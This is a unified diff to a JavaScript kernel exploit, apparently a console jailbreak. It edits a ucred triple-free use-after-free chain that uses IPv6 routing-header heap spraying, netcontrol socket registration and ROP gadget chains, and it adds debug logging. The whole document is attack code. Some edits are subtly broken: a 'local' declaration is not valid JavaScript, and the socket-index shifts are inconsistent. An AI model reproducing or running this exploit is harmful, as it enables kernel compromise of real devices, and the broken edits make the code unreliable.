@@ -138,8 +138,8 @@ var twins = new Array(2);
 var triplets = new Array(3);
 var ipv6_socks = new Array(IPV6_SOCK_NUM);
 var spray_rthdr = malloc(UCRED_SIZE);
-var spray_rthdr_len = -1;
-var leak_rthdr = malloc(UCRED_SIZE);
+var spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
+
 
 // Allocate buffer for ipv6_sockets magic spray
 var spray_rthdr_rop = malloc(IPV6_SOCK_NUM * UCRED_SIZE);
@@ -198,11 +198,11 @@ var tmp = malloc(PAGE_SIZE);
 var saved_fpu_ctrl = 0;
 var saved_mxcsr = 0;
 function build_rthdr(buf, size) {
-  var len = (size >> 3) - 1 & ~1;
+  var len = (size >> 3) - 1 & 0xFFFFFFFE;
   var actual_size = len + 1 << 3;
   write8(buf.add(0x00), 0); // ip6r_nxt
   write8(buf.add(0x01), len); // ip6r_len
-  write8(buf.add(0x02), IPV6_RTHDR_TYPE_0); // ip6r_type
+  write8(buf.add(0x02), 0); // ip6r_type
   write8(buf.add(0x03), len >> 1); // ip6r_segleft
   return actual_size;
 }
@@ -246,9 +246,9 @@ var real_set_rthdr = set_rthdr;
 
 // 3) wrapper اختياري للّوج
 set_rthdr = function (sock, buf, len) {
-  log("[RTHDR] BEFORE sock=" + sock + " len=" + len);
+  //log("[RTHDR] BEFORE sock=" + sock + " len=" + len);
   var ret = real_set_rthdr(sock, buf, len);
-  log("[RTHDR] AFTER ret=" + ret);
+  //log("[RTHDR] AFTER ret=" + ret);
   return ret;
 };
 
@@ -262,9 +262,9 @@ var real_get_rthdr = get_rthdr;
 
 // 3) wrapper للّوج لو حابب
 get_rthdr = function (sock, buf, len) {
-  log("[RTHDR-GET] BEFORE sock=" + sock + " max_len=" + len);
+  //log("[RTHDR-GET] BEFORE sock=" + sock + " max_len=" + len);
   var ret = real_get_rthdr(sock, buf, len);
-  log("[RTHDR-GET] AFTER ret=" + ret);
+  //log("[RTHDR-GET] AFTER ret=" + ret);
   return ret;
 };
 function free_rthdrs(sds) {
@@ -787,84 +787,180 @@ function fill_buffer_64(buf, val, len) {
     write64(buf.add(i), val);
   }
 }
+var leak_len = malloc(4);
+var leak_rthdr = malloc(16);
+
+function dbg() {
+  log("[DBG] " + Array.from(arguments).join(" "));
+}
+
 function find_twins() {
+  dbg("=== find_twins() START ===");
+
   var count = 0;
   var val, i, j;
   var zeroMemoryCount = 0;
+
   twins[0] = -1;
   twins[1] = -1;
+
   var spray_add = spray_rthdr.add(0x04);
-  var leak_add = leak_rthdr.add(0x04);
+  var leak_add  = leak_rthdr.add(0x04);
+
   while (count < MAX_ROUNDS_TWIN) {
+
+    dbg("Round:", count);
+
+    // Memory check
     if (typeof debugging !== 'undefined' && debugging.info && debugging.info.memory && debugging.info.memory.available === 0) {
       zeroMemoryCount++;
+      dbg("Memory low, zeroMemoryCount =", zeroMemoryCount);
+
       if (zeroMemoryCount >= 5) {
+        dbg("Memory exhausted, cleanup()");
         cleanup();
         return false;
       }
     } else {
       zeroMemoryCount = 0;
     }
+
+    // WRITE LOOP
+    dbg("WRITE LOOP START");
+
     for (i = 0; i < ipv6_socks.length; i++) {
-      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
+
+      if (!ipv6_socks[i + 1] || ipv6_socks[i + 1].eq(BigInt_Error)) {
+        dbg("WRITE SKIP i =", i, "sock invalid");
+        continue;
+      }
+
+      dbg("WRITE i =", i, "sock =", ipv6_socks[i + 1]);
 
       write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add); // تعديل رقم 2 (memory barrier)
+      dbg("write32 TAG =", (RTHDR_TAG | i).toString(16));
 
-      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
+      set_rthdr(ipv6_socks[i + 1], spray_rthdr, spray_rthdr_len);
+      dbg("set_rthdr done");
     }
+
+    // READ LOOP
+    dbg("READ LOOP START");
+
     for (i = 0; i < ipv6_socks.length; i++) {
-      if (ipv6_socks[i].eq(BigInt_Error)) continue;
-      write32(leak_add, 0); // تعديل رقم 4
-      get_rthdr(ipv6_socks[i], leak_rthdr, 8);
+
+      if (!ipv6_socks[i + 1] || ipv6_socks[i + 1].eq(BigInt_Error)) {
+        dbg("READ SKIP i =", i, "sock invalid");
+        continue;
+      }
+
+      dbg("READ i =", i, "sock =", ipv6_socks[i + 1]);
+
+      write32(leak_len, 8);
+      get_rthdr(ipv6_socks[i + 1], leak_rthdr, leak_len);
+
       val = read32(leak_add);
       j = val & 0xFFFF;
-      if ((val & 0xFFFF0000) === RTHDR_TAG && i === j && j >= 0 && j < ipv6_socks.length) {
+
+      dbg("val =", val.toString(16), "i =", i, "j =", j);
+
+      if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j >= 0 && j < ipv6_socks.length) {
+        dbg("FOUND TWINS i =", i, "j =", j);
         twins[0] = i;
         twins[1] = j;
-        log(' TWINS : [' + i + '] [' + j + ']');
+        log("TWINS : [" + i + "] [" + j + "]");
         return true;
       }
     }
+
+    dbg("Round", count, "END");
     count++;
   }
+
+  dbg("NO TWINS FOUND");
   twins[0] = -1;
   twins[1] = -1;
+
+  dbg("=== find_twins() END ===");
   return false;
 }
+
 function find_triplet(master, other, iterations) {
-  if (typeof iterations === 'undefined') iterations = MAX_ROUNDS_TRIPLET;
+
+  if (typeof iterations === 'undefined')
+    iterations = MAX_ROUNDS_TRIPLET;
+
+  dbg("=== find_triplet() START ===");
+  dbg("master =", master, "other =", other, "iterations =", iterations);
+
   var count = 0;
   var val, i, j;
+
   var spray_add = spray_rthdr.add(0x04);
-  var leak_add = leak_rthdr.add(0x04);
+  var leak_add  = leak_rthdr.add(0x04);
+
   while (count < iterations) {
+
+    dbg("Round:", count);
+
+    // WRITE LOOP
+    dbg("WRITE LOOP START");
+
     for (i = 0; i < ipv6_socks.length; i++) {
-      if (i === master || i === other) continue;
-      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
+
+      if (i === master || i === other) {
+        dbg("SKIP i =", i, "(master/other)");
+        continue;
+      }
+
+      if (!ipv6_socks[i + 1] || ipv6_socks[i + 1].eq(BigInt_Error)) {
+        dbg("SKIP i =", i, "(invalid sock)");
+        continue;
+      }
+
+      dbg("WRITE i =", i, "sock =", ipv6_socks[i + 1]);
 
       write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add); // تعديل رقم 2
+      dbg("write32 TAG =", (RTHDR_TAG | i).toString(16));
 
-      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
+      set_rthdr(ipv6_socks[i + 1], spray_rthdr, spray_rthdr_len);
+      dbg("set_rthdr done");
     }
-    write32(leak_add, 0); // تعديل رقم 4
-    get_rthdr(ipv6_socks[master], leak_rthdr, 8);
+
+    // READ PHASE
+    dbg("READ PHASE START");
+
+    write32(leak_len, 8);
+    dbg("write32 leak_len = 8");
+
+    get_rthdr(ipv6_socks[master + 1], leak_rthdr, leak_len);
+    dbg("get_rthdr sock index =", master + 1);
+
     val = read32(leak_add);
     j = val & 0xFFFF;
 
-    // تعديل رقم 3 (منع false positives)
+    dbg("val =", val.toString(16), "j =", j);
+
+    // منع false positives
     if (j === master || j === other) {
+      dbg("SKIP j =", j, "(master/other)");
       count++;
       continue;
     }
+
     if ((val & 0xFFFF0000) === RTHDR_TAG && j >= 0 && j < ipv6_socks.length) {
+      dbg("FOUND TRIPLET j =", j);
       return j;
     }
+
+    dbg("No match this round");
     count++;
   }
+
+  dbg("=== find_triplet() END (no result) ===");
   return -1;
 }
+
 function init_threading() {
   var jmpbuf = malloc(0x60);
   if (!jmpbuf || jmpbuf.eq(0)) {
@@ -1301,22 +1397,24 @@ function trigger_ucred_triplefree() {
 
     // 1) dummy socket → register in netcontrol
     var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
-    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
+    var sock_buf = malloc(8); 
+    write32(sock_buf, dummy_socket);
+    netcontrol(-1, 0x20000003, sock_buf, 8);
     close(new BigInt(dummy_socket));
 
     // 2) allocate new ucred
     setuid(1);
 
     // 3) reclaim fd → uaf_socket
-    uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));
+    uaf_socket = socket(AF_UNIX, SOCK_STREAM, 0);
 
     // 4) free previous ucred
     setuid(1);
 
     // 5) unregister → free file + ucred
-    write32(nc_clear_buf, uaf_socket);
-    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
+    local ctrl_buf = malloc(8); 
+    write32(ctrl_buf, uaf_socket);
+    netcontrol(-1, 0x20000007, ctrl_buf, 8);
 
     // 6) محاولة إصلاح refcount بشكل خفيف
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
@@ -2064,7 +2162,7 @@ function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_
   // Spray all sockets
   for (var i = 0; i < ipv6_socks.length; i++) {
     rop.push(gadgets.POP_RDI_RET);
-    rop.push(ipv6_socks[i]);
+    rop.push(ipv6_socks[i + 1]);
     rop.push(gadgets.POP_RSI_RET);
     rop.push(new BigInt(IPPROTO_IPV6));
     rop.push(gadgets.POP_RDX_RET);
@@ -2085,7 +2183,7 @@ function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_
     rop.push(gadgets.POP_RDI_RET);
     rop.push(ipv6_socks[_i15]);
     // debug("");
-    // debug("pushed sock: " + hex(ipv6_socks[i]));
+    // debug("pushed sock: " + hex(ipv6_socks[i + 1]));
     rop.push(gadgets.POP_RSI_RET);
     rop.push(new BigInt(IPPROTO_IPV6));
     rop.push(gadgets.POP_RDX_RET);
